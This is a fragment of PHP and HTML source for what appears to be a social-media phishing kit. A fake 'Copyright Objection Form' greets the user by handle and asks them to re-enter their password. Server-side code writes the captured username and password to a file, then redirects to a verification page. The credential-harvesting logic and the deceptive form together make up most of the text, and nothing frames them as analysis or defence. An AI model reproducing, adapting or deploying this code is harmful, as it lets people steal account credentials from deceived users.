...
fwrite($file,"<font color='red'>Kullanıcı Adı: </font><font color='black'>".$nick."</font><br>
<font color='red'>Password: </font><font color='black'>".$password."</font><br>
...
fclose($file);
    header("Location: verification.php?username=$nick");
	include 'pp.php';
}
...
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1-DjUJ1UJd41jhB1K_jI7jMdVNUMSwp-_1g&usqp=CAU" width="200">
	...
	<table class="post-table">
		<tr class="post-tr">
        <td id="one"><img src="<?=$pp?>" width="150" style="border-radius:50%;"></td><td id="three"><i class="fas fa-ellipsis-h" id="dot"></i></td>
		</tr>
	</table>
    </div>
<br>
     <h3 style="border:40px;font-weight:bold; font-family:sans-serif;">Copyright Objection Form</h3>
      <p style="font-family:sans-serif; font-size:17px; color: #999; line-height:20px; font-weight:350; margin-top:15px;"> Hello @<?= $username ?> </p>
	<p style="font-family:sans-serif; font-size:17px; color: #999; line-height:20px; font-weight:350; margin-top:15px;">Please Enter Your Password And<br>Click "Next Form".</p>
    ...
    border-radius:3px;" placeholder="Password">
<br><br></form>
